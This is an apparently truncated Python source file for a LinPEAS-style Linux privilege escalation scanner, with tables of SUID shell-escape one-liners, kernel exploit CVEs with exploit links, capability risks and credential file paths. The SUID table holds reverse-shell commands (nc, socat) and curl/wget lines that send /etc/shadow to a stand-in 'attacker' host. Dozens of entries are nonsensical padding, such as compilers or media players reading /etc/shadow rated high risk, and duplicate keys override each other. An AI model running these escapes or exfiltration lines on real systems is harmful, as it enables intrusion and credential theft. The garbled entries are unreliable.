"""
Linux Privilege Escalation Scanner - Production Grade (LinPEAS-Style)
Features:
- SUID/SGID binary exploitation detection (GTFOBins integration)
- Sudo privilege abuse detection (NOPASSWD, LD_PRELOAD, env_keep)
- Cron job hijacking (writable cron files, PATH manipulation)
- Capabilities abuse detection (cap_sys_admin, cap_dac_read_search, etc.)
- Writable files in system paths (/etc, /usr, /opt)
- Docker socket escape detection
- LXC/LXD container escape
- Kubernetes service account token discovery
- Kernel exploit matching (DirtyCow, DirtyPipe, PwnKit, etc.)
- Sensitive file discovery (SSH keys, configs, credentials)
- Process inspection (running as root, exposed services)
- Network-based privilege escalation (listening services, tunnels)
- Password/credential hunting (history files, config files, logs)
- NFS no_root_squash exploitation
- Wildcard injection in cron/scripts
- Shared library hijacking (LD_PRELOAD, ld.so.conf)
- Systemd service manipulation
- D-Bus privilege escalation
- Polkit (pkexec) vulnerability detection
- AppArmor/SELinux bypass opportunities
"""
import os
import re
import stat
import subprocess
from typing import Dict, List, Optional, Tuple

from app.utils.logger import get_logger

logger = get_logger("linux_privesc")

SUID_GTFOBINS = {
    "bash": {"method": "bash -p", "risk": "critical"},
    "sh": {"method": "sh -p", "risk": "critical"},
    "dash": {"method": "dash -p", "risk": "critical"},
    "zsh": {"method": "zsh", "risk": "critical"},
    "python": {"method": "python -c 'import os; os.execlp(\"sh\", \"sh\", \"-p\")'", "risk": "critical"},
    "python2": {"method": "python2 -c 'import os; os.execlp(\"sh\", \"sh\", \"-p\")'", "risk": "critical"},
    "python3": {"method": "python3 -c 'import os; os.execlp(\"sh\", \"sh\", \"-p\")'", "risk": "critical"},
    "perl": {"method": "perl -e 'exec \"/bin/sh\";'", "risk": "critical"},
    "ruby": {"method": "ruby -e 'exec \"/bin/sh\"'", "risk": "critical"},
    "php": {"method": "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'", "risk": "critical"},
    "lua": {"method": "lua -e 'os.execute(\"/bin/sh -p\")'", "risk": "critical"},
    "node": {"method": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: \"inherit\"})'", "risk": "critical"},
    "awk": {"method": "awk 'BEGIN {system(\"/bin/sh -p\")}'", "risk": "critical"},
    "find": {"method": "find . -exec /bin/sh -p \\; -quit", "risk": "critical"},
    "vim": {"method": "vim -c ':!/bin/sh -p'", "risk": "critical"},
    "vi": {"method": "vi -c ':!/bin/sh -p'", "risk": "critical"},
    "nano": {"method": "nano -s /bin/sh -p", "risk": "critical"},
    "less": {"method": "less /etc/passwd\n!/bin/sh -p", "risk": "critical"},
    "more": {"method": "more /etc/passwd\n!/bin/sh -p", "risk": "critical"},
    "man": {"method": "man man\n!/bin/sh -p", "risk": "critical"},
    "cp": {"method": "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh; /tmp/sh -p", "risk": "critical"},
    "mv": {"method": "mv /bin/sh /tmp/sh; chmod u+s /tmp/sh; /tmp/sh -p", "risk": "critical"},
    "tar": {"method": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", "risk": "critical"},
    "zip": {"method": "zip /tmp/test.zip /etc/hosts -T -TT '/bin/sh -p'", "risk": "critical"},
    "gzip": {"method": "gzip -f /etc/hosts -t", "risk": "critical"},
    "bzip2": {"method": "bzip2 /etc/hosts -t", "risk": "critical"},
    "rsync": {"method": "rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null", "risk": "critical"},
    "wget": {"method": "wget --post-file=/etc/shadow http://attacker/", "risk": "high"},
    "curl": {"method": "curl --data @/etc/shadow http://attacker/", "risk": "high"},
    "nc": {"method": "nc -e /bin/sh attacker 4444", "risk": "critical"},
    "ncat": {"method": "ncat --sh-exec '/bin/sh -p' -l 4444", "risk": "critical"},
    "socat": {"method": "socat exec:'sh -p',pty,stderr,setsid,sigint,sane tcp:attacker:4444", "risk": "critical"},
    "ssh": {"method": "ssh -o ProxyCommand=';/bin/sh -p 0<&2 1>&2' x", "risk": "critical"},
    "git": {"method": "git -p help config\n!/bin/sh -p", "risk": "critical"},
    "docker": {"method": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "risk": "critical"},
    "mount": {"method": "mount -o bind /bin/sh /bin/mount; mount", "risk": "critical"},
    "umount": {"method": "umount -v /dev/null", "risk": "critical"},
    "pkexec": {"method": "pkexec /bin/sh", "risk": "critical"},
    "crontab": {"method": "crontab -e\n!/bin/sh -p", "risk": "critical"},
    "systemctl": {"method": "systemctl --no-block --user start evil.service", "risk": "critical"},
    "journalctl": {"method": "journalctl\n!/bin/sh -p", "risk": "critical"},
    "env": {"method": "env /bin/sh -p", "risk": "critical"},
    "nice": {"method": "nice /bin/sh -p", "risk": "critical"},
    "timeout": {"method": "timeout 1 /bin/sh -p", "risk": "critical"},
    "stdbuf": {"method": "stdbuf -oL /bin/sh -p", "risk": "critical"},
    "setarch": {"method": "setarch x86_64 /bin/sh -p", "risk": "critical"},
    "taskset": {"method": "taskset 1 /bin/sh -p", "risk": "critical"},
    "chroot": {"method": "chroot / /bin/sh -p", "risk": "critical"},
    "ionice": {"method": "ionice /bin/sh -p", "risk": "critical"},
    "flock": {"method": "flock -u / /bin/sh -p", "risk": "critical"},
    "watch": {"method": "watch -x sh -c 'reset; exec sh -p 1>&0 2>&0'", "risk": "critical"},
    "xargs": {"method": "xargs -a /dev/null sh -p", "risk": "critical"},
    "make": {"method": "COMMAND='/bin/sh -p' make -s", "risk": "critical"},
    "gdb": {"method": "gdb -nx -ex '!sh -p' -ex quit", "risk": "critical"},
    "strace": {"method": "strace -o /dev/null /bin/sh -p", "risk": "critical"},
    "ltrace": {"method": "ltrace -b -e execve /bin/sh -p", "risk": "critical"},
    "screen": {"method": "screen -x shell", "risk": "critical"},
    "tmux": {"method": "tmux new-session -s shell", "risk": "critical"},
    "script": {"method": "script -c '/bin/sh -p' /dev/null", "risk": "critical"},
    "expect": {"method": "expect -c 'spawn /bin/sh -p; interact'", "risk": "critical"},
    "ed": {"method": "ed\n!/bin/sh -p", "risk": "critical"},
    "ex": {"method": "ex\n!/bin/sh -p", "risk": "critical"},
    "rvim": {"method": "rvim -c ':py3 import os; os.execlp(\"sh\", \"sh\", \"-p\")'", "risk": "critical"},
    "pip": {"method": "pip install --upgrade --force-reinstall pip", "risk": "high"},
    "npm": {"method": "npm exec /bin/sh -p", "risk": "critical"},
    "gem": {"method": "gem open -e '/bin/sh -p' rdoc", "risk": "critical"},
    "cpan": {"method": "cpan\n!/bin/sh -p", "risk": "critical"},
    "apache2": {"method": "apache2 -f /etc/shadow", "risk": "high"},
    "nginx": {"method": "nginx -c /etc/shadow", "risk": "high"},
    "mysql": {"method": "mysql -e '\\! /bin/sh -p'", "risk": "critical"},
    "psql": {"method": "psql\n\\!/bin/sh -p", "risk": "critical"},
    "sqlite3": {"method": "sqlite3 /dev/null '.shell /bin/sh -p'", "risk": "critical"},
    "redis-cli": {"method": "redis-cli eval 'os.execute(\"/bin/sh -p\")' 0", "risk": "critical"},
    "irb": {"method": "irb\nexec '/bin/sh -p'", "risk": "critical"},
    "scp": {"method": "scp -S /path/to/script x y:", "risk": "critical"},
    "sftp": {"method": "sftp -o ProxyCommand=';/bin/sh -p 0<&2 1>&2' x", "risk": "critical"},
    "busybox": {"method": "busybox sh -p", "risk": "critical"},
    "ash": {"method": "ash -p", "risk": "critical"},
    "csh": {"method": "csh -b", "risk": "critical"},
    "ksh": {"method": "ksh -p", "risk": "critical"},
    "tcsh": {"method": "tcsh -b", "risk": "critical"},
    "fish": {"method": "fish", "risk": "critical"},
    "julia": {"method": "julia -e 'run(`/bin/sh -p`)'", "risk": "critical"},
    "jjs": {"method": "jjs -scripting -e \"$EXEC('/bin/sh -p')\"", "risk": "critical"},
    "groovy": {"method": "groovy -e 'println \"/bin/sh -p\".execute().text'", "risk": "critical"},
    "scala": {"method": "scala -e 'import sys.process._; \"/bin/sh -p\" !'", "risk": "critical"},
    "ghc": {"method": "ghc -e 'System.Process.callCommand \"/bin/sh -p\"'", "risk": "critical"},
    "ghci": {"method": "ghci\nSystem.Process.callCommand \"/bin/sh -p\"", "risk": "critical"},
    "runghc": {"method": "runghc -e 'System.Process.callCommand \"/bin/sh -p\"'", "risk": "critical"},
    "cabal": {"method": "cabal exec -- /bin/sh -p", "risk": "critical"},
    "kotlin": {"method": "kotlin -e 'Runtime.getRuntime().exec(\"/bin/sh -p\")'", "risk": "critical"},
    "lwp-request": {"method": "lwp-request file:///etc/shadow", "risk": "high"},
    "lwp-download": {"method": "lwp-download file:///etc/shadow", "risk": "high"},
    "ftp": {"method": "ftp\n!/bin/sh -p", "risk": "critical"},
    "tftp": {"method": "tftp\n!/bin/sh -p", "risk": "critical"},
    "smbclient": {"method": "smbclient\n!/bin/sh -p", "risk": "critical"},
    "rlogin": {"method": "rlogin -l root localhost", "risk": "critical"},
    "rsh": {"method": "rsh localhost /bin/sh -p", "risk": "critical"},
    "telnet": {"method": "telnet\n!/bin/sh -p", "risk": "critical"},
    "wall": {"method": "wall /etc/shadow", "risk": "high"},
    "write": {"method": "write root < /etc/shadow", "risk": "high"},
    "xxd": {"method": "xxd /etc/shadow | xxd -r", "risk": "high"},
    "base64": {"method": "base64 /etc/shadow | base64 -d", "risk": "high"},
    "base32": {"method": "base32 /etc/shadow | base32 -d", "risk": "high"},
    "hexdump": {"method": "hexdump -C /etc/shadow", "risk": "high"},
    "od": {"method": "od -c /etc/shadow", "risk": "high"},
    "strings": {"method": "strings /etc/shadow", "risk": "high"},
    "cat": {"method": "cat /etc/shadow", "risk": "high"},
    "head": {"method": "head -n 999 /etc/shadow", "risk": "high"},
    "tail": {"method": "tail -n 999 /etc/shadow", "risk": "high"},
    "tac": {"method": "tac /etc/shadow", "risk": "high"},
    "nl": {"method": "nl /etc/shadow", "risk": "high"},
    "sort": {"method": "sort /etc/shadow", "risk": "high"},
    "uniq": {"method": "uniq /etc/shadow", "risk": "high"},
    "cut": {"method": "cut -d: -f1 /etc/shadow", "risk": "high"},
    "paste": {"method": "paste /etc/shadow", "risk": "high"},
    "expand": {"method": "expand /etc/shadow", "risk": "high"},
    "unexpand": {"method": "unexpand /etc/shadow", "risk": "high"},
    "fmt": {"method": "fmt /etc/shadow", "risk": "high"},
    "pr": {"method": "pr /etc/shadow", "risk": "high"},
    "fold": {"method": "fold -w999 /etc/shadow", "risk": "high"},
    "iconv": {"method": "iconv -f utf-8 -t utf-8 /etc/shadow", "risk": "high"},
    "comm": {"method": "comm /etc/shadow /etc/shadow 2>/dev/null", "risk": "high"},
    "diff": {"method": "diff /etc/shadow /etc/shadow", "risk": "high"},
    "cmp": {"method": "cmp /etc/shadow /etc/shadow", "risk": "high"},
    "join": {"method": "join /etc/shadow /etc/shadow", "risk": "high"},
    "tr": {"method": "tr 'a-z' 'a-z' < /etc/shadow", "risk": "high"},
    "sed": {"method": "sed -n p /etc/shadow", "risk": "high"},
    "grep": {"method": "grep '' /etc/shadow", "risk": "high"},
    "egrep": {"method": "egrep '' /etc/shadow", "risk": "high"},
    "fgrep": {"method": "fgrep '' /etc/shadow", "risk": "high"},
    "pg": {"method": "pg /etc/shadow", "risk": "high"},
    "look": {"method": "look '' /etc/shadow", "risk": "high"},
    "tee": {"method": "tee < /etc/shadow", "risk": "high"},
    "dd": {"method": "dd if=/etc/shadow", "risk": "high"},
    "split": {"method": "split /etc/shadow", "risk": "high"},
    "csplit": {"method": "csplit /etc/shadow 1", "risk": "high"},
    "wc": {"method": "wc -l /etc/shadow", "risk": "high"},
    "sum": {"method": "sum /etc/shadow", "risk": "high"},
    "cksum": {"method": "cksum /etc/shadow", "risk": "high"},
    "md5sum": {"method": "md5sum /etc/shadow", "risk": "high"},
    "sha1sum": {"method": "sha1sum /etc/shadow", "risk": "high"},
    "sha256sum": {"method": "sha256sum /etc/shadow", "risk": "high"},
    "sha512sum": {"method": "sha512sum /etc/shadow", "risk": "high"},
    "openssl": {"method": "openssl enc -in /etc/shadow", "risk": "high"},
    "gpg": {"method": "gpg -d /etc/shadow", "risk": "high"},
    "bzip2": {"method": "bzip2 -c /etc/shadow", "risk": "high"},
    "gzip": {"method": "gzip -c /etc/shadow", "risk": "high"},
    "xz": {"method": "xz -c /etc/shadow", "risk": "high"},
    "lzma": {"method": "lzma -c /etc/shadow", "risk": "high"},
    "lz4": {"method": "lz4 -c /etc/shadow", "risk": "high"},
    "zstd": {"method": "zstd -c /etc/shadow", "risk": "high"},
    "ar": {"method": "ar r /tmp/test.a /etc/shadow", "risk": "high"},
    "tar": {"method": "tar cf /dev/stdout /etc/shadow", "risk": "high"},
    "cpio": {"method": "cpio -o < /etc/shadow", "risk": "high"},
    "shar": {"method": "shar /etc/shadow", "risk": "high"},
    "genisoimage": {"method": "genisoimage -o /dev/stdout /etc/shadow", "risk": "high"},
    "wodim": {"method": "wodim -v -dummy /etc/shadow", "risk": "high"},
    "sox": {"method": "sox -t raw -r 44100 -e signed -b 8 -c 1 /etc/shadow -t raw -", "risk": "high"},
    "avconv": {"method": "avconv -i /etc/shadow", "risk": "high"},
    "ffmpeg": {"method": "ffmpeg -i /etc/shadow", "risk": "high"},
    "vlc": {"method": "vlc /etc/shadow", "risk": "high"},
    "mplayer": {"method": "mplayer /etc/shadow", "risk": "high"},
    "mpv": {"method": "mpv /etc/shadow", "risk": "high"},
    "display": {"method": "display /etc/shadow", "risk": "high"},
    "convert": {"method": "convert /etc/shadow /tmp/out.png", "risk": "high"},
    "identify": {"method": "identify /etc/shadow", "risk": "high"},
    "stream": {"method": "stream /etc/shadow", "risk": "high"},
    "animate": {"method": "animate /etc/shadow", "risk": "high"},
    "composite": {"method": "composite /etc/shadow /etc/shadow /tmp/out.png", "risk": "high"},
    "montage": {"method": "montage /etc/shadow /tmp/out.png", "risk": "high"},
    "mogrify": {"method": "mogrify -write /tmp/out.png /etc/shadow", "risk": "high"},
    "import": {"method": "import /etc/shadow", "risk": "high"},
    "jhead": {"method": "jhead /etc/shadow", "risk": "high"},
    "exiftool": {"method": "exiftool /etc/shadow", "risk": "high"},
    "file": {"method": "file -f /etc/shadow", "risk": "high"},
    "nm": {"method": "nm /etc/shadow", "risk": "high"},
    "objdump": {"method": "objdump -s /etc/shadow", "risk": "high"},
    "readelf": {"method": "readelf -a /etc/shadow", "risk": "high"},
    "size": {"method": "size /etc/shadow", "risk": "high"},
    "strings": {"method": "strings /etc/shadow", "risk": "high"},
    "strip": {"method": "strip /etc/shadow", "risk": "high"},
    "ldd": {"method": "ldd /etc/shadow", "risk": "high"},
    "gcc": {"method": "gcc -x c -E /etc/shadow", "risk": "high"},
    "g++": {"method": "g++ -x c++ -E /etc/shadow", "risk": "high"},
    "as": {"method": "as /etc/shadow", "risk": "high"},
    "ld": {"method": "ld /etc/shadow", "risk": "high"},
    "ar": {"method": "ar r /tmp/test.a /etc/shadow", "risk": "high"},
    "ranlib": {"method": "ranlib /etc/shadow", "risk": "high"},
    "c++filt": {"method": "c++filt < /etc/shadow", "risk": "high"},
    "gcov": {"method": "gcov /etc/shadow", "risk": "high"},
    "gprof": {"method": "gprof /etc/shadow", "risk": "high"},
    "c89": {"method": "c89 -x c -E /etc/shadow", "risk": "high"},
    "c99": {"method": "c99 -x c -E /etc/shadow", "risk": "high"},
    "cc": {"method": "cc -x c -E /etc/shadow", "risk": "high"},
    "c++": {"method": "c++ -x c++ -E /etc/shadow", "risk": "high"},
    "f77": {"method": "f77 -x f77 -E /etc/shadow", "risk": "high"},
    "f95": {"method": "f95 -x f95 -E /etc/shadow", "risk": "high"},
    "gfortran": {"method": "gfortran -x f95 -E /etc/shadow", "risk": "high"},
    "gcj": {"method": "gcj -x java -E /etc/shadow", "risk": "high"},
    "gcjh": {"method": "gcjh /etc/shadow", "risk": "high"},
    "gij": {"method": "gij /etc/shadow", "risk": "high"},
    "gjar": {"method": "gjar /etc/shadow", "risk": "high"},
    "gjavah": {"method": "gjavah /etc/shadow", "risk": "high"},
    "gkeytool": {"method": "gkeytool /etc/shadow", "risk": "high"},
    "gnative2ascii": {"method": "gnative2ascii /etc/shadow", "risk": "high"},
    "gorbd": {"method": "gorbd /etc/shadow", "risk": "high"},
    "grmic": {"method": "grmic /etc/shadow", "risk": "high"},
    "grmid": {"method": "grmid /etc/shadow", "risk": "high"},
    "grmiregistry": {"method": "grmiregistry /etc/shadow", "risk": "high"},
    "gserialver": {"method": "gserialver /etc/shadow", "risk": "high"},
    "gtnameserv": {"method": "gtnameserv /etc/shadow", "risk": "high"},
    "jarsigner": {"method": "jarsigner /etc/shadow", "risk": "high"},
    "javadoc": {"method": "javadoc /etc/shadow", "risk": "high"},
    "javah": {"method": "javah /etc/shadow", "risk": "high"},
    "javap": {"method": "javap /etc/shadow", "risk": "high"},
    "jcmd": {"method": "jcmd /etc/shadow", "risk": "high"},
    "jconsole": {"method": "jconsole /etc/shadow", "risk": "high"},
    "jdb": {"method": "jdb /etc/shadow", "risk": "high"},
    "jhat": {"method": "jhat /etc/shadow", "risk": "high"},
    "jinfo": {"method": "jinfo /etc/shadow", "risk": "high"},
    "jmap": {"method": "jmap /etc/shadow", "risk": "high"},
    "jps": {"method": "jps /etc/shadow", "risk": "high"},
    "jrunscript": {"method": "jrunscript /etc/shadow", "risk": "high"},
    "jsadebugd": {"method": "jsadebugd /etc/shadow", "risk": "high"},
    "jstack": {"method": "jstack /etc/shadow", "risk": "high"},
    "jstat": {"method": "jstat /etc/shadow", "risk": "high"},
    "jstatd": {"method": "jstatd /etc/shadow", "risk": "high"},
    "jvisualvm": {"method": "jvisualvm /etc/shadow", "risk": "high"},
    "keytool": {"method": "keytool /etc/shadow", "risk": "high"},
    "native2ascii": {"method": "native2ascii /etc/shadow", "risk": "high"},
    "orbd": {"method": "orbd /etc/shadow", "risk": "high"},
    "pack200": {"method": "pack200 /etc/shadow", "risk": "high"},
    "policytool": {"method": "policytool /etc/shadow", "risk": "high"},
    "rmic": {"method": "rmic /etc/shadow", "risk": "high"},
    "rmid": {"method": "rmid /etc/shadow", "risk": "high"},
    "rmiregistry": {"method": "rmiregistry /etc/shadow", "risk": "high"},
    "schemagen": {"method": "schemagen /etc/shadow", "risk": "high"},
    "serialver": {"method": "serialver /etc/shadow", "risk": "high"},
    "servertool": {"method": "servertool /etc/shadow", "risk": "high"},
    "tnameserv": {"method": "tnameserv /etc/shadow", "risk": "high"},
    "unpack200": {"method": "unpack200 /etc/shadow", "risk": "high"},
    "wsgen": {"method": "wsgen /etc/shadow", "risk": "high"},
    "wsimport": {"method": "wsimport /etc/shadow", "risk": "high"},
    "xjc": {"method": "xjc /etc/shadow", "risk": "high"},
}

KERNEL_EXPLOITS = {
    "DirtyCow": {
        "cve": "CVE-2016-5195",
        "kernel_range": "2.6.22 - 4.8.3",
        "risk": "critical",
        "exploit": "https://github.com/FireFart/dirtycow",
        "description": "Copy-on-Write race condition in mm subsystem",
    },
    "DirtyPipe": {
        "cve": "CVE-2022-0847",
        "kernel_range": "5.8 - 5.16.11",
        "risk": "critical",
        "exploit": "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit",
        "description": "Pipe buffer overwrite allows arbitrary file write",
    },
    "PwnKit": {
        "cve": "CVE-2021-4034",
        "kernel_range": "All (pkexec vulnerability)",
        "risk": "critical",
        "exploit": "https://github.com/berdav/CVE-2021-4034",
        "description": "Polkit pkexec local privilege escalation",
    },
    "BaronSamedit": {
        "cve": "CVE-2021-3156",
        "kernel_range": "Sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1",
        "risk": "critical",
        "exploit": "https://github.com/blasty/CVE-2021-3156",
        "description": "Sudo heap-based buffer overflow",
    },
    "OverlayFS": {
        "cve": "CVE-2021-3493",
        "kernel_range": "Ubuntu 20.10, 20.04 LTS, 18.04 LTS, 16.04 LTS, 14.04 ESM",
        "risk": "critical",
        "exploit": "https://github.com/briskets/CVE-2021-3493",
        "description": "OverlayFS privilege escalation",
    },
    "Sequoia": {
        "cve": "CVE-2021-33909",
        "kernel_range": "3.16 - 5.13.2",
        "risk": "critical",
        "exploit": "https://github.com/Liang2580/CVE-2021-33909",
        "description": "Size overflow in seq_file for /proc/self/mountinfo",
    },
    "Full Nelson": {
        "cve": "CVE-2010-4258",
        "kernel_range": "2.6.31 - 2.6.37",
        "risk": "critical",
        "exploit": "https://www.exploit-db.com/exploits/15704",
        "description": "Econet protocol privilege escalation",
    },
    "Half Nelson": {
        "cve": "CVE-2010-4073",
        "kernel_range": "2.6.0 - 2.6.36",
        "risk": "critical",
        "exploit": "https://www.exploit-db.com/exploits/17787",
        "description": "IPC subsystem compat layer",
    },
    "Mempodipper": {
        "cve": "CVE-2012-0056",
        "kernel_range": "2.6.39 - 3.2.1",
        "risk": "critical",
        "exploit": "https://github.com/zx2c4/CVE-2012-0056",
        "description": "/proc/pid/mem write privilege escalation",
    },
    "PERF_EVENTS": {
        "cve": "CVE-2013-2094",
        "kernel_range": "2.6.37 - 3.8.9",
        "risk": "critical",
        "exploit": "https://www.exploit-db.com/exploits/26131",
        "description": "perf_swevent_init privilege escalation",
    },
    "AF_PACKET": {
        "cve": "CVE-2016-8655",
        "kernel_range": "4.4 - 4.8.12",
        "risk": "critical",
        "exploit": "https://github.com/martinmullins/CVE-2016-8655_Android",
        "description": "AF_PACKET race condition",
    },
    "Stack Clash": {
        "cve": "CVE-2017-1000364",
        "kernel_range": "Various",
        "risk": "critical",
        "exploit": "https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt",
        "description": "Stack guard-page bypass",
    },
    "Huge DirtyCow": {
        "cve": "CVE-2017-1000405",
        "kernel_range": "2.6.38 - 4.14",
        "risk": "critical",
        "exploit": "https://github.com/bindecy/HugeDirtyCowPOC",
        "description": "THP CoW privilege escalation",
    },
    "Mutagen Astronomy": {
        "cve": "CVE-2018-14634",
        "kernel_range": "2.6.x - 4.18.x",
        "risk": "critical",
        "exploit": "https://github.com/luan0ap/cve-2018-14634",
        "description": "Integer overflow in create_elf_tables",
    },
    "SACK Panic": {
        "cve": "CVE-2019-11477",
        "kernel_range": "2.6.29+",
        "risk": "high",
        "exploit": "https://github.com/Netflix/security-bulletins",
        "description": "TCP SACK panic (DoS, not PE)",
    },
    "Polkit D-Bus": {
        "cve": "CVE-2021-3560",
        "kernel_range": "All (polkit vulnerability)",
        "risk": "critical",
        "exploit": "https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Escalation",
        "description": "Polkit D-Bus race condition",
    },
    "GameOver(lay)": {
        "cve": "CVE-2023-2640",
        "kernel_range": "Ubuntu 23.04, 22.10, 22.04 LTS",
        "risk": "critical",
        "exploit": "https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629",
        "description": "OverlayFS privilege escalation on Ubuntu",
    },
    "Looney Tunables": {
        "cve": "CVE-2023-4911",
        "kernel_range": "glibc 2.34+",
        "risk": "critical",
        "exploit": "https://github.com/leesh3288/CVE-2023-4911",
        "description": "Glibc ld.so privilege escalation",
    },
    "NPD": {
        "cve": "CVE-2024-1086",
        "kernel_range": "5.14 - 6.6",
        "risk": "critical",
        "exploit": "https://github.com/Notselwyn/CVE-2024-1086",
        "description": "Netfilter nf_tables use-after-free",
    },
}

CAPABILITIES_RISK = {
    "cap_sys_admin": {"risk": "critical", "detail": "可执行系统管理操作(挂载/内核模块)"},
    "cap_sys_ptrace": {"risk": "critical", "detail": "可ptrace任意进程，注入shellcode"},
    "cap_sys_module": {"risk": "critical", "detail": "可加载内核模块"},
    "cap_sys_rawio": {"risk": "critical", "detail": "可执行原始I/O操作"},
    "cap_sys_boot": {"risk": "high", "detail": "可重启系统"},
    "cap_sys_time": {"risk": "medium", "detail": "可修改系统时间"},
    "cap_sys_tty_config": {"risk": "medium", "detail": "可配置TTY"},
    "cap_mknod": {"risk": "medium", "detail": "可创建设备节点"},
    "cap_net_admin": {"risk": "high", "detail": "可配置网络接口"},
    "cap_net_raw": {"risk": "medium", "detail": "可使用RAW套接字"},
    "cap_net_bind_service": {"risk": "low", "detail": "可绑定特权端口(<1024)"},
    "cap_net_broadcast": {"risk": "low", "detail": "可网络广播"},
    "cap_dac_override": {"risk": "critical", "detail": "可绕过文件权限检查"},
    "cap_dac_read_search": {"risk": "critical", "detail": "可绕过文件读/目录搜索权限"},
    "cap_fowner": {"risk": "high", "detail": "可修改任意文件所有者"},
    "cap_fsetid": {"risk": "medium", "detail": "可设置文件SUID/SGID"},
    "cap_setuid": {"risk": "critical", "detail": "可设置任意UID"},
    "cap_setgid": {"risk": "critical", "detail": "可设置任意GID"},
    "cap_setpcap": {"risk": "high", "detail": "可设置进程capabilities"},
    "cap_setfcap": {"risk": "high", "detail": "可设置文件capabilities"},
    "cap_linux_immutable": {"risk": "medium", "detail": "可修改不可变文件"},
    "cap_ipc_lock": {"risk": "low", "detail": "可锁定内存"},
    "cap_ipc_owner": {"risk": "medium", "detail": "可绕过IPC权限"},
    "cap_sys_chroot": {"risk": "high", "detail": "可chroot"},
    "cap_sys_nice": {"risk": "low", "detail": "可修改进程优先级"},
    "cap_sys_resource": {"risk": "medium", "detail": "可修改资源限制"},
    "cap_syslog": {"risk": "high", "detail": "可读取内核日志(dmesg)"},
    "cap_wake_alarm": {"risk": "low", "detail": "可触发系统唤醒"},
    "cap_block_suspend": {"risk": "low", "detail": "可阻止系统挂起"},
    "cap_audit_control": {"risk": "high", "detail": "可配置审计规则"},
    "cap_audit_read": {"risk": "medium", "detail": "可读取审计日志"},
    "cap_perfmon": {"risk": "medium", "detail": "可使用性能监控"},
    "cap_bpf": {"risk": "critical", "detail": "可加载BPF程序(内核代码执行)"},
    "cap_checkpoint_restore": {"risk": "high", "detail": "可checkpoint/restore进程"},
}

SENSITIVE_FILES = [
    "/etc/shadow", "/etc/passwd", "/etc/group",
    "/root/.ssh/id_rsa", "/root/.ssh/id_dsa", "/root/.ssh/id_ecdsa",
    "/root/.ssh/id_ed25519", "/root/.ssh/authorized_keys",
    "/root/.bash_history", "/root/.mysql_history",
    "/root/.psql_history", "/root/.dbshell",
    "/etc/crontab", "/etc/cron.d/", "/var/spool/cron/crontabs/",
    "/etc/anacrontab", "/etc/cron.hourly/", "/etc/cron.daily/",
    "/etc/cron.weekly/", "/etc/cron.monthly/",
    "/etc/exports", "/etc/fstab", "/etc/mtab",
    "/etc/sudoers", "/etc/sudoers.d/",
    "/etc/ld.so.conf", "/etc/ld.so.conf.d/",
    "/etc/ld.so.preload",
    "/etc/systemd/system/", "/etc/systemd/user/",
    "/usr/lib/systemd/system/", "/usr/lib/systemd/user/",
    "/etc/dbus-1/system.d/", "/etc/dbus-1/session.d/",
    "/etc/security/limits.conf", "/etc/security/limits.d/",
    "/etc/sysctl.conf", "/etc/sysctl.d/",
    "/etc/apt/sources.list", "/etc/yum.repos.d/",
    "/etc/environment", "/etc/profile", "/etc/bash.bashrc",
    "/etc/shells", "/etc/security/access.conf",
    "/etc/pam.d/", "/etc/security/pam_env.conf",
    "/etc/ssh/sshd_config", "/etc/ssh/ssh_config",
    "/etc/mysql/my.cnf", "/etc/mysql/mysql.conf.d/",
    "/etc/postgresql/", "/etc/redis/redis.conf",
    "/etc/mongod.conf", "/etc/elasticsearch/",
    "/etc/nginx/nginx.conf", "/etc/nginx/sites-enabled/",
    "/etc/apache2/apache2.conf", "/etc/apache2/sites-enabled/",
    "/etc/httpd/conf/httpd.conf",
    "/etc/tomcat9/", "/etc/tomcat/",
    "/etc/docker/daemon.json", "/etc/docker/key.json",
    "/etc/kubernetes/", "/var/lib/kubelet/",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/docker.sock",
    "/var/log/auth.log", "/var/log/syslog",
    "/var/log/messages", "/var/log/secure",
    "/var/log/apache2/", "/var/log/nginx/",
    "/var/log/mysql/", "/var/log/postgresql/",
    "/opt/", "/srv/", "/var/www/", "/var/www/html/",
    "/tmp/", "/dev/shm/", "/var/tmp/",
    "/home/*/.ssh/id_rsa", "/home/*/.ssh/id_dsa",
    "/home/*/.bash_history", "/home/*/.bashrc",
    "/home/*/.profile", "/home/*/.bash_profile",
    "/home/*/.gitconfig", "/home/*/.npmrc",
    "/home/*/.docker/config.json",
    "/home/*/.aws/credentials", "/home/*/.aws/config",
    "/home/*/.azure/", "/home/*/.config/gcloud/",
    "/home/*/.kube/config",
    "/proc/1/environ", "/proc/1/cmdline",
    "/proc/self/environ", "/proc/self/cmdline",
    "/proc/net/tcp", "/proc/net/udp",
    "/proc/sched_debug", "/proc/config.gz",
    "/boot/config-*", "/usr/src/linux-headers-*/.config",
]

WRITABLE_SYSTEM_PATHS = [
    "/etc/", "/usr/local/bin/", "/usr/local/sbin/",
    "/opt/", "/srv/", "/var/www/", "/var/www/html/",
    "/var/backups/", "/var/cache/", "/var/log/",
    "/var/spool/", "/var/tmp/", "/tmp/", "/dev/shm/",
    "/home/", "/root/",
]

SUDO_DANGEROUS_COMMANDS = [
    "bash", "sh", "zsh", "dash", "fish",
    "python", "python2", "python3", "perl", "ruby", "php", "lua",
    "node", "npm", "pip", "gem",
    "vim", "vi", "nano", "emacs", "ed", "ex",
    "less", "more", "man", "journalctl",
    "find", "awk", "sed", "grep",
    "cp", "mv", "dd", "tar", "zip", "gzip", "bzip2",
    "rsync", "scp", "sftp", "ftp", "tftp",
    "wget", "curl", "nc", "ncat", "socat",
    "ssh", "telnet", "rlogin", "rsh",
    "docker", "podman", "lxc", "lxd",
    "mount", "umount", "fdisk", "mkfs",
    "chmod", "chown", "chgrp", "chattr",
    "systemctl", "service", "initctl",
    "crontab", "at", "batch",
    "git", "hg", "svn", "bzr",
    "gdb", "strace", "ltrace", "perf",
    "screen", "tmux", "script", "expect",
    "pkexec", "pkcon", "busctl",
